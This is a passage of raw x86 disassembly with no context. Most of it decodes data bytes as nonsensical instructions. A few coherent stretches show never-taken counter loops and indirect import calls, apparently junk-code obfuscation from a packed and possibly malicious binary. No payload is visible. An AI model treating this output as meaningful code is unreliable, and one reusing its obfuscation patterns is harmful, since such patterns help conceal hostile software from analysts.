  419597:	mul    BYTE PTR [edi+eiz*1+0x6ed02996]
  41959e:	inc    ebx
  41959f:	call   0x32a5bb2
  4195a4:	mov    dh,0x2d
  4195a6:	dec    ebp
  4195a7:	adc    eax,0x63b6be98
  4195ac:	stc    
  4195ad:	mov    bh,0xc4
  4195af:	and    BYTE PTR [ebx+0x5f3b35ae],al
  4195b5:	pop    ebx
  4195b6:	aaa    
  4195b7:	test   DWORD PTR [ebp-0x68],esi
  4195ba:	je     0x419635
  4195bc:	xor    al,0x70
  4195be:	ds push edx
  4195c0:	push   eax
  4195c1:	es (bad) 
  4195c3:	retf   0x57e2
  4195c6:	cwde   
  4195c7:	aas    
  4195c8:	or     cl,BYTE PTR [esi+0x4f3d47fc]
  4195ce:	and    al,0x30
  4195d0:	(bad)
  4195d3:	fimul  WORD PTR [edi+esi*2]
  4195d6:	scas   al,BYTE PTR es:[edi]
  4195d7:	jge    0x419646
  4195d9:	js     0x41961a
  4195db:	das    
  4195dc:	and    eax,0xcc5f2f79
  4195e1:	xor    DWORD PTR [ebx],edi
  4195e3:	ds push ebp
  4195e5:	jno    0x41963e
  4195e7:	popa   
  4195e8:	add    al,0xb1
  4195ea:	jmp    0xe1e:0xc18f0c53
  4195f1:	pop    es
  4195f2:	(bad)  
  4195f3:	mov    cl,0xea
  4195f5:	loope  0x4195f7
  4195f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195f8:	xor    DWORD PTR [di-0x18],0xffffffa2
  4195fd:	push   eax
  4195fe:	jb     0x419596
  419600:	repz adc BYTE PTR [ebx-0x7b],0x59
  419605:	inc    esp
  419606:	pop    ecx
  419607:	retf   
  419608:	call   0xc980e875
  41960d:	ror    DWORD PTR [esi],1
  41960f:	out    0xe0,al
  419611:	mov    ds:0x990c0909,al
  419616:	jmp    0x4195ef
  419618:	mov    dh,0x2a
  41961a:	push   ss
  41961b:	mov    al,0x5a
  41961d:	add    bh,al
  41961f:	pop    ecx
  419620:	ja     0x419635
  419622:	stc    
  419623:	test   al,0x23
  419625:	pop    eax
  419626:	xlat   BYTE PTR ds:[ebx]
  419627:	nop
  419628:	(bad)  
  419629:	out    0x6b,eax
  41962b:	(bad)  
  41962d:	sub    bh,al
  41962f:	push   edi
  419630:	mov    edx,0xc9b8cb7c
  419635:	pop    ds
  419636:	sub    al,0x82
  419638:	push   esp
  419639:	and    al,0x44
  41963b:	inc    ebx
  41963c:	cdq    
  41963d:	adc    cl,BYTE PTR ds:[edi+0x4b]
  419641:	sub    al,0xad
  419643:	enter  0x5f20,0x5c
  419647:	mov    ecx,DWORD PTR [ecx+ebp*1-0x73]
  41964b:	sahf   
  41964c:	mov    al,ds:0x3c9aa7e4
  419651:	repnz inc eax
  419653:	mov    edx,0x9590ee6a
  419658:	mov    esp,DWORD PTR [bp+di-0x2f0f]
  41965d:	push   0xbfe5881e
  419662:	or     DWORD PTR [edx+edi*1],ebx
  419665:	call   0xe821:0x2d5f7bdd
  41966c:	xchg   ebp,eax
  41966d:	loop   0x419601
  41966f:	rcr    DWORD PTR [esi+0x1e],1
  419672:	push   ebp
  419673:	lods   al,BYTE PTR ds:[esi]
  419674:	xor    DWORD PTR ds:0x5a69dfcd,ebp
  41967a:	sub    al,0xcd
  41967c:	mov    bl,0x90
  41967e:	sahf   
  41967f:	jmp    0x4196be
  419681:	in     al,dx
  419682:	mov    BYTE PTR [edi+0xc],ah
  419685:	mov    esi,0xb2c4287b
  41968a:	cmp    BYTE PTR [eax+0x6a],ah
  41968d:	mov    ebx,0x88b9c084
  419692:	es jno 0x41970c
  419695:	and    eax,0x439d1b97
  41969a:	test   al,0xd0
  41969c:	adc    edi,eax
  41969e:	inc    edx
  41969f:	mov    dl,0xab
  4196a1:	pop    ss
  4196a2:	cmp    eax,0x7bcb073a
  4196a7:	and    BYTE PTR [esi+ebx*2],ah
  4196aa:	gs push cs
  4196ac:	jo     0x419720
  4196ae:	ja     0x419639
  4196b0:	in     eax,0x6f
  4196b2:	pop    ebp
  4196b3:	(bad)  
  4196b4:	gs icebp 
  4196b6:	shr    DWORD PTR [ebx],cl
  4196b8:	mov    BYTE PTR [eax+0x69],bl
  4196bb:	stos   DWORD PTR es:[edi],eax
  4196bc:	mov    DWORD PTR [ebx+eax*8+0x42f58e33],esi
  4196c3:	jge    0x4196d2
  4196c5:	fucom  st(0)
  4196c7:	cmp    esp,DWORD PTR [eax-0x3c32d9af]
  4196cd:	jge    0x4196e4
  4196cf:	(bad)  
  4196d0:	mov    ds:0x3410d046,al
  4196d5:	cmc    
  4196d6:	test   al,0x35
  4196d8:	and    DWORD PTR [eax-0x5fac8c0d],edi
  4196de:	mov    bl,0x8e
  4196e0:	repnz inc ebx
  4196e2:	dec    esi
  4196e3:	sub    eax,0x30d4151f
  4196e8:	add    edi,DWORD PTR [edi+0x1e]
  4196eb:	adc    DWORD PTR [ebp+0x15],edi
  4196ee:	cmp    dh,BYTE PTR [eax-0x116b4b3d]
  4196f4:	nop
  4196f5:	or     eax,0xd358079
  4196fa:	out    0xa3,al
  4196fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196fd:	ins    BYTE PTR es:[edi],dx
  4196fe:	add    DWORD PTR [ecx-0x35],edx
  419701:	mov    ds:0x10b2193f,al
  419706:	sahf   
  419707:	add    al,0x3b
  41970a:	pop    ebx
  41970b:	add    ecx,DWORD PTR [eax+esi*4+0x1e]
  41970f:	xor    bl,BYTE PTR [ecx-0x3f]
  419712:	inc    esi
  419713:	pop    ecx
  419714:	jmp    0x51abde16
  419719:	jmp    0xe99c404a
  41971e:	stos   DWORD PTR es:[edi],eax
  41971f:	lods   eax,DWORD PTR ds:[esi]
  419720:	out    dx,eax
  419721:	and    BYTE PTR [ebp-0x36],ch
  419724:	aaa    
  419725:	sub    BYTE PTR [ebp+0x13],cl
  419728:	adc    esp,eax
  41972a:	adc    eax,0xedc7439a
  41972f:	adc    BYTE PTR [esi+0x67],bl
  419732:	adc    DWORD PTR [edx+0x32],0xe51703e6
  419739:	out    dx,al
  41973a:	repnz mov al,ds:0xb3e27bcd
  419740:	mov    eax,0xa18788ae
  419745:	mov    ?,ebx
  419747:	and    eax,0x83e1fb46
  41974c:	dec    ebp
  41974d:	mov    ecx,DWORD PTR fs:[ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x1d2addeb
  41979d:	and    BYTE PTR [eax+0x787fc938],ch
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x4197c5
  4197a8:	lahf   
  4197a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197aa:	add    eax,0xd47e08af
  4197af:	js     0x4197f0
  4197b1:	dec    edi
  4197b2:	les    esi,FWORD PTR ss:[ebp+0x3f2b3509]
  4197b9:	das    
  4197ba:	out    dx,eax
  4197bb:	mov    ebp,0xc30a92dd
  4197c0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4197c2:	std    
  4197c3:	hlt    
  4197c4:	xor    bh,BYTE PTR [edi+0x57d4dae0]
  4197ca:	test   al,0xd9
  4197cc:	scas   al,BYTE PTR es:[edi]
  4197cd:	mov    eax,DWORD PTR [ecx+0x47830384]
  4197d3:	cmp    bh,BYTE PTR [edx+0x49c8a49d]
  4197d9:	dec    eax
  4197da:	xchg   esi,eax
  4197db:	xor    WORD PTR [esi-0x41174e2f],dx
  4197e2:	idiv   BYTE PTR [ebp+0x2d]
  4197e5:	ficom  DWORD PTR [ecx+0x37]
  4197e8:	sbb    al,0x47
  4197ea:	arpl   WORD PTR [eax],si
  4197ec:	lea    edx,[esp+ecx*2-0x3e2c68d5]
  4197f3:	js     0x4197dc
  4197f5:	cmp    eax,0xa92d7e60
  4197fa:	mov    esi,0x34d528e6
  4197ff:	cwde   
  419800:	jbe    0x4197a5
  419802:	push   0x763d0745
  419807:	sub    al,BYTE PTR [edi+0x3f]
  41980a:	sub    DWORD PTR [edx],0x7f
  41980d:	fnsave [esi+0x5f]
  419810:	gs mov ah,0xaa
  419813:	sar    DWORD PTR [ecx],1
  419815:	xchg   ebx,eax
  419816:	pop    ds
  419817:	jo     0x419862
  419819:	pop    ecx
  41981a:	aaa    
  41981b:	push   eax
  41981c:	lea    ebx,[ecx-0x42]
  41981f:	pop    edx
  419820:	les    ebp,FWORD PTR [ebx-0x7996fad7]
  419826:	inc    ecx
  419827:	inc    ebp
  419828:	repz push 0x9d8a8f96
  41982e:	mov    eax,0x44442b14
  419833:	ins    DWORD PTR es:[edi],dx
  419834:	not    BYTE PTR [eax+0x2f]
  419837:	mov    ds:0xc735c074,al
  41983c:	(bad)  
  41983d:	out    dx,eax
  41983e:	lods   eax,DWORD PTR ds:[esi]
  41983f:	es inc edx
  419841:	test   al,0xbf
  419843:	push   esp
  419844:	or     dh,al
  419846:	push   edi
  419847:	push   es
  419848:	push   ss
  419849:	inc    edx
  41984a:	call   0x78d89ee9
  41984f:	xchg   esi,eax
  419850:	push   0x8524008a
  419855:	mov    cl,BYTE PTR [esi-0x1d]
  419858:	mov    BYTE PTR [ecx],dl
  41985a:	pusha  
  41985b:	mov    ch,0x9a
  41985d:	shl    DWORD PTR [esi],cl
  41985f:	and    BYTE PTR [ebx+edx*2-0x68e21a53],al
  419866:	rcr    ch,0x66
  419869:	sbb    dh,BYTE PTR [esi]
  41986b:	aam    0x5b
  41986d:	xchg   BYTE PTR [edi+edx*2-0x5],ch
  419871:	jg     0x4198a8
  419873:	xchg   esp,eax
  419874:	xchg   ebx,eax
  419875:	out    dx,eax
  419876:	inc    DWORD PTR [ebp+0x42a1be03]
  41987c:	and    ebx,0x24
  41987f:	jne    0x419834
  419881:	ja     0x4198ab
  419883:	in     eax,0xcd
  419885:	ins    BYTE PTR es:[edi],dx
  419886:	or     al,0xdf
  419888:	and    esp,DWORD PTR [eax+0x7de72547]
  41988e:	or     al,0x96
  419890:	pop    esi
  419891:	sbb    al,0x3d
  419893:	rol    BYTE PTR [edx],0xc0
  419896:	dec    edx
  419897:	and    al,0x46
  419899:	sbb    edx,edx
  41989b:	mov    al,ds:0xec16b654
  4198a0:	jmp    0x175d31f1
  4198a5:	mov    ebp,0xea6326a3
  4198aa:	leave  
  4198ab:	mov    bl,0xb4
  4198ad:	xchg   DWORD PTR [ebp+0x79],ebp
  4198b0:	sti    
  4198b1:	out    dx,eax
  4198b2:	in     eax,dx
  4198b3:	dec    eax
  4198b4:	lods   al,BYTE PTR ds:[esi]
  4198b5:	retf   0xd853
  4198b8:	(bad)  [eax]
  4198ba:	push   ebp
  4198bb:	add    eax,0x4b16c2aa
  4198c0:	inc    esp
  4198c1:	or     eax,DWORD PTR [edi]
  4198c3:	fs in  al,0xa4
  4198c6:	mov    edx,0x2ad5bfbc
  4198cb:	into   
  4198cc:	imul   edi,ebx,0xa38203da
  4198d2:	xor    al,0x63
  4198d4:	jg     0x419925
  4198d6:	fwait
  4198d7:	xchg   ebx,eax
  4198d8:	in     eax,dx
  4198d9:	xchg   BYTE PTR [edx],cl
  4198db:	scas   al,BYTE PTR es:[edi]
  4198dc:	push   0x17
  4198de:	clc    
  4198df:	ja     0x41989a
  4198e1:	push   edx
  4198e2:	xor    eax,ebx
  4198e4:	gs out 0xe6,eax
  4198e7:	fmul   DWORD PTR [edx+0x5e]
  4198ea:	mov    ch,dh
  4198ec:	add    bl,BYTE PTR [ebx]
  4198ee:	mov    cs,WORD PTR [ebp*4+0x1c005085]
  4198f5:	pop    ss
  4198f6:	sub    BYTE PTR [esi],ch
  4198f8:	inc    esp
  4198f9:	cmp    eax,0xb47ca465
  4198fe:	xchg   ecx,eax
  4198ff:	pop    edx
  419900:	stc    
  419901:	(bad)  
  419902:	mov    edi,0x1d048765
  419907:	sub    al,0xd1
  419909:	mov    ecx,0x81bb0766
  41990e:	add    esp,ebx
  419910:	fdiv   QWORD PTR [eax-0x77]
  419913:	push   eax
  419914:	pushf  
  419915:	mov    bh,0xd8
  419917:	bound  esp,QWORD PTR [ebx-0x58]
  41991a:	mov    bl,0x73
  41991c:	add    edi,DWORD PTR [edi-0x75]
  41991f:	pop    ss
  419920:	jmp    0xcf8b3b09
  419925:	fisub  WORD PTR [ecx]
  419927:	pop    edi
  419928:	cmp    BYTE PTR [eax-0x2b],cl
  41992b:	mov    al,0xb8
  41992d:	ins    DWORD PTR es:[edi],dx
  41992e:	fs pop ds
  419930:	xor    eax,0x1649967d
  419935:	(bad)  
  419937:	mov    ecx,0x98f48d58
  41993c:	popf   
  41993d:	dec    edx
  41993e:	add    BYTE PTR [edx+0x3120d4f2],0xe
  419945:	aad    0xc5
  419947:	loope  0x4198f5
  419949:	sub    DWORD PTR cs:[eax],0x46c50b4
  419950:	(bad)  
  419952:	out    dx,eax
  419953:	adc    eax,0xd2054703
  419958:	and    eax,0x2982fd4a
  41995d:	xor    dl,cl
  41995f:	fldenv [edi+0x58]
  419962:	ret    
  419963:	or     esi,DWORD PTR [edx-0x606b25bb]
  419969:	retf   
  41996a:	pushf  
  41996b:	pop    ecx
  41996c:	jno    0x41995b
  41996e:	xor    ebp,edx
  419970:	repz sbb bl,ch
  419973:	std    
  419974:	pop    es
  419975:	lahf   
  419976:	mov    ebx,0x9014a953
  41997b:	lds    edx,FWORD PTR [ebp+0x6e]
  41997e:	lods   eax,DWORD PTR ds:[esi]
  41997f:	and    eax,0x26bd7674
  419984:	mov    ebx,DWORD PTR [eax]
  419986:	pop    ss
  419987:	mov    bl,0xee
  419989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41998a:	mov    dl,0x5c
  41998c:	out    dx,al
  41998d:	outs   dx,BYTE PTR ds:[esi]
  41998e:	jmp    0x54ee740f
  419993:	jmp    0xc9e1e860
  419998:	mov    bl,dl
  41999a:	mov    ebp,0xa413105c
  41999f:	in     eax,0xd5
  4199a1:	adc    BYTE PTR [eax],cl
  4199a3:	mov    esp,0x76d43935
  4199a8:	aaa    
  4199a9:	mov    esp,0x6cbeda98
  4199ae:	and    DWORD PTR [esi-0x35],edi
  4199b1:	jae    0x41995e
  4199b3:	mov    ah,0x96
  4199b5:	jg     0x4199bc
  4199b7:	std    
  4199b8:	cmp    al,BYTE PTR [ecx]
  4199ba:	push   esi
  4199bb:	ror    BYTE PTR ds:0xd72b93bf,1
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0xffffffb7
  419b14:	inc    eax
  419b15:	icebp  
  419b16:	ret    0xcfd0
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b54
  419b20:	jno    0x419b22
  419b22:	daa    
  419b23:	jae    0x419b24
  419b25:	popf   
  419b26:	jbe    0x419b4f
  419b28:	mov    al,0xbb
  419b2a:	push   edi
  419b2b:	je     0x419afd
  419b2d:	rcl    ch,1
  419b2f:	cwde   
  419b30:	imul   esi,DWORD PTR [esi+0x6fc9a796],0x933112b1
  419b3a:	out    dx,al
  419b3b:	push   0xff5838a6
  419b40:	sbb    eax,DWORD PTR [esi-0x65]
  419b43:	push   ebp
  419b44:	ins    BYTE PTR es:[edi],dx
  419b45:	push   DWORD PTR [edi+0x37]
  419b48:	repnz add edx,edi
  419b4b:	inc    esi
  419b4c:	sub    esi,edi
  419b4e:	cmp    al,0x57
  419b50:	pop    ebx
  419b51:	xchg   BYTE PTR [edx-0x58],ch
  419b54:	clc    
  419b55:	ds xchg ecx,edi
  419b58:	frndint 
  419b5a:	inc    esi
  419b5b:	sub    DWORD PTR [eax],ecx
  419b5d:	add    DWORD PTR [esi+0x70],0x43174322
  419b64:	(bad)  
  419b65:	cmp    ebx,DWORD PTR [ebx]
  419b67:	rol    DWORD PTR [eax-0x4cb3dca0],0x13
  419b6e:	clc    
  419b6f:	inc    eax
  419b70:	movd   DWORD PTR [ebx+0x75],mm7
  419b74:	jecxz  0x419b93
  419b76:	cmp    BYTE PTR [edx+0x875e506],0x42
  419b7d:	and    esi,edx
  419b7f:	daa    
  419b80:	sbb    ebx,DWORD PTR [esi]
  419b82:	call   0xf2b94421
  419b87:	es inc edi
  419b89:	mov    bh,0x6c
  419b8b:	inc    edi
  419b8c:	mov    bl,0xdc
  419b8e:	mov    ds:0x92f1148c,al
  419b93:	xchg   edi,eax
  419b94:	stos   DWORD PTR es:[edi],eax
  419b95:	push   ebx
  419b96:	pop    ebp
  419b97:	scas   al,BYTE PTR es:[edi]
  419b98:	nop
  419b99:	jg     0x419bb2
  419b9b:	(bad)  
  419b9c:	loopne 0x419be7
  419b9e:	pop    ebx
  419b9f:	mul    DWORD PTR [ebx]
  419ba1:	stos   DWORD PTR es:[edi],eax
  419ba2:	fdivr  QWORD PTR [ebx+0x6b434c56]
  419ba8:	bound  edx,QWORD PTR [ecx-0x64]
  419bab:	lods   al,BYTE PTR ds:[esi]
  419bac:	(bad)  
  419bad:	dec    edi
  419bae:	lea    edi,[ecx]
  419bb0:	mov    ebx,0x7bf94c23
  419bb5:	adc    al,BYTE PTR [edi]
  419bb7:	mov    WORD PTR [esi],?
  419bb9:	dec    esi
  419bba:	fbstp  TBYTE PTR [eax+0x2b]
  419bbd:	cli    
  419bbe:	sub    al,0xa7
  419bc0:	and    al,0x38
  419bc2:	popf   
  419bc3:	mov    al,0x72
  419bc5:	xchg   ebp,eax
  419bc6:	pop    ds
  419bc7:	popf   
  419bc8:	xchg   esp,eax
  419bc9:	mov    esi,0xeac46fb
  419bce:	sub    edi,DWORD PTR [edi+0x3149b0fb]
  419bd4:	shl    BYTE PTR [esi-0x6e4d78d8],0x7
  419bdb:	mov    esi,0x59e69ac1
  419be0:	push   esi
  419be1:	mov    bl,0xdc
  419be3:	stos   BYTE PTR es:[edi],al
  419be4:	xchg   edx,eax
  419be5:	in     al,dx
  419be6:	outs   dx,DWORD PTR fs:[esi]
  419be8:	xor    esi,esp
  419bea:	lahf   
  419beb:	call   0x7e892bc1
  419bf0:	add    eax,0x3f9aa20d
  419bf5:	daa    
  419bf6:	add    eax,0x897b7337
  419bfb:	jge    0x419bd4
  419bfd:	jb     0x419bad
  419bff:	arpl   WORD PTR [esi+0x64dd7ac8],sp
  419c05:	dec    ecx
  419c06:	push   esp
  419c07:	dec    edi
  419c08:	pop    eax
  419c09:	pop    es
  419c0a:	sub    DWORD PTR [bx+si+0x20],0x7f
  419c0f:	popa   
  419c10:	mov    al,0x14
  419c12:	cmp    DWORD PTR [esi+0x1e],ebp
  419c15:	cmp    cl,ah
  419c17:	je     0x419c3d
  419c19:	aas    
  419c1a:	frstor [esi+0x21e80f2b]
  419c20:	shl    DWORD PTR [ebx+0x4a040674],cl
  419c26:	add    ecx,DWORD PTR [ebp-0x2a]
  419c29:	call   0xdedc:0x6abc3641
  419c30:	std    
  419c31:	test   al,0xb1
  419c33:	ja     0x419c93
  419c35:	jecxz  0x419c2b
  419c37:	(bad)  
  419c38:	(bad)  
  419c39:	sbb    al,BYTE PTR [eax-0x5f]
  419c3c:	rcl    BYTE PTR ds:0x48fff1c4,1
  419c42:	push   esi
  419c43:	lahf   
  419c44:	fmul   DWORD PTR [eax]
  419c46:	mov    edi,0x3fadfce4
  419c4b:	(bad)  
  419c4c:	and    BYTE PTR [ebx+0x68a5f2e0],al
  419c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c53:	jmp    0xac05cbdf
  419c58:	(bad)  
  419c59:	xchg   ebp,eax
  419c5a:	mov    dh,0x32
  419c5c:	adc    ebp,ecx
  419c5e:	mov    bh,0x55
  419c60:	aad    0x3b
  419c62:	add    DWORD PTR [edi-0x17],ecx
  419c65:	outs   dx,BYTE PTR ds:[esi]
  419c66:	pop    ecx
  419c67:	jecxz  0x419cc7
  419c69:	sub    esp,DWORD PTR [ebx]
  419c6b:	(bad)
  419c6e:	ret    0xfe83
  419c71:	lods   eax,DWORD PTR cs:[esi]
  419c73:	push   ebp
  419c74:	and    cl,BYTE PTR [edi+0x65c089d9]
  419c7a:	pop    edx
  419c7b:	mov    bl,0x9f
  419c7d:	ins    BYTE PTR es:[edi],dx
  419c7e:	std    
  419c7f:	jecxz  0x419c35
  419c81:	cld    
  419c82:	sbb    ah,al
  419c84:	and    esi,DWORD PTR [edi-0x7bd0a549]
  419c8a:	inc    eax
  419c8b:	push   cs
  419c8c:	xchg   DWORD PTR [ebx+0x42ac4175],esp
  419c92:	(bad)  
  419c93:	mov    BYTE PTR [ecx+edi*4-0x3f83e8a7],bl
  419c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c9b:	adc    edi,ebp
  419c9d:	sub    cl,BYTE PTR [eax-0x23cb58]
  419ca3:	jae    0x419d0b
  419ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ca6:	sbb    WORD PTR [esi+edx*1-0x7fc2b497],si
  419cae:	mov    WORD PTR [ebx+0x78714a2],?
  419cb4:	mov    eax,0xf2f2ed2
  419cb9:	in     eax,0x3b
  419cbb:	ss mov bh,0x7a
  419cbe:	and    ah,bh
  419cc0:	mov    ds:0x9733419e,al
  419cc5:	mov    ebx,0xc8f5fd9f
  419cca:	push   ss
  419ccb:	(bad)  
  419ccc:	or     al,0x38
  419cce:	lods   al,BYTE PTR ds:[esi]
  419ccf:	pop    ebp
  419cd0:	mov    ecx,DWORD PTR [edx-0x36]
  419cd3:	fcomp  DWORD PTR [edx]
  419cd5:	inc    ecx
  419cd6:	push   ss
  419cd7:	mov    BYTE PTR [ebx-0x694b5ba4],ah
  419cdd:	repz cmp BYTE PTR [esp+edx*4],dl
  419ce1:	pop    esi
  419ce2:	ret    0xa9d8
  419ce5:	sbb    DWORD PTR ds:0x8c6f2ccb,esp
  419ceb:	sbb    al,0xdc
  419cee:	nop
  419cef:	mov    cl,0xbc
  419cf1:	pop    ebx
  419cf2:	dec    edx
  419cf3:	mov    ds,esi
  419cf5:	js     0x419c97
  419cf7:	push   ss
  419cf8:	and    esi,DWORD PTR [ebx+eiz*2]
  419cfb:	sub    DWORD PTR ds:0x18fdaf49,0x43
  419d02:	xchg   BYTE PTR [edi+edi*1],cl
  419d05:	es push 0x9a2ac97e
  419d0b:	cs es call 0xc790:0x5f92fea0
  419d14:	jmp    0x5f69c185
  419d19:	mov    ebx,0x3a383b0c
  419d1e:	pop    eax
  419d1f:	cmp    dh,BYTE PTR [ebp+0x42]
  419d22:	jns    0x419ca8
  419d24:	sub    BYTE PTR [ebx],ah
  419d26:	xchg   esp,eax
  419d27:	mov    dh,0x56
  419d29:	out    dx,eax
  419d2a:	sbb    ecx,0xffffffed
  419d2d:	retf   
  419d2e:	shl    DWORD PTR [eax+0x40],1
  419d31:	aam    0xf
  419d33:	mov    ebp,0x8ba7024b
  419d38:	inc    ebp
  419d39:	loopne 0x419d4a
  419d3b:	test   BYTE PTR [ecx+0x4000000b],cl
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	cli    
  419d7d:	lds    esi,FWORD PTR [edx-0x21]
  419d80:	call   0x10ba1d52
  419d85:	jle    0x419dff
  419d87:	js     0x419dc5
  419d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d8a:	pop    esi
  419d8b:	xor    ecx,DWORD PTR [ecx+0x2f3a01fb]
  419d91:	adc    BYTE PTR [edx],bh
  419d93:	pop    edx
  419d94:	popf   
  419d95:	pusha  
  419d96:	das    
  419d97:	outs   dx,DWORD PTR ds:[esi]
  419d98:	mov    eax,0x1cf7a1a4
  419d9d:	cs pop ds
  419d9f:	jb     0x419d25
  419da1:	popf   
  419da2:	mov    eax,0x2ef3f669
  419da7:	out    dx,al
  419da8:	sub    esp,0xffffffeb
  419dab:	mov    eax,fs:0xd727ad98
  419db1:	retf   
  419db2:	inc    ecx
  419db3:	sbb    eax,0x188c2546
  419db8:	rcl    BYTE PTR [esi-0x23],0x5b
  419dbc:	nop
  419dbd:	ret    0x63b3
  419dc0:	add    eax,edx
  419dc2:	push   esp
  419dc3:	push   ecx
  419dc4:	and    al,BYTE PTR [eax]
  419dc6:	sti    
  419dc7:	clc    
  419dc8:	dec    edi
  419dc9:	inc    ebp
  419dca:	in     eax,dx
  419dcb:	and    dl,BYTE PTR [eax]
  419dcd:	in     al,dx
  419dce:	aad    0x11
  419dd0:	and    BYTE PTR [eax+0x2703733b],0xb2
  419dd7:	ret    
  419dd8:	mov    DWORD PTR [ebp-0x2227e6f8],eax
  419dde:	inc    ecx
  419ddf:	dec    eax
  419de0:	outs   dx,BYTE PTR ds:[esi]
  419de1:	sbb    DWORD PTR [edi+0x19587a2b],eax
  419de7:	dec    edi
  419de8:	data16 jl 0x419ddc
  419deb:	sti    
  419dec:	push   edi
  419ded:	sub    dl,dh
  419def:	adc    al,0x9a
  419df1:	add    eax,0x5eaa205
  419df6:	pop    ds
  419df7:	mov    ds:0xffabbc40,al
  419dfc:	sti    
  419dfd:	in     al,dx
  419dfe:	xlat   BYTE PTR ds:[ebx]
  419dff:	cwde   
  419e00:	retf   0xf8f0
  419e03:	(bad)
  419e06:	xor    ebx,DWORD PTR [edx]
  419e08:	jmp    0xf8b6:0x9d361ce0
  419e0f:	ret    
  419e10:	jne    0x419da0
  419e12:	xor    ebp,edx
  419e14:	sahf   
  419e15:	mov    esp,0xfa01e4a6
  419e1a:	cmp    eax,0xb8e01dcf
  419e1f:	imul   esp,DWORD PTR [esi],0xffffff9a
  419e22:	out    0xe8,eax
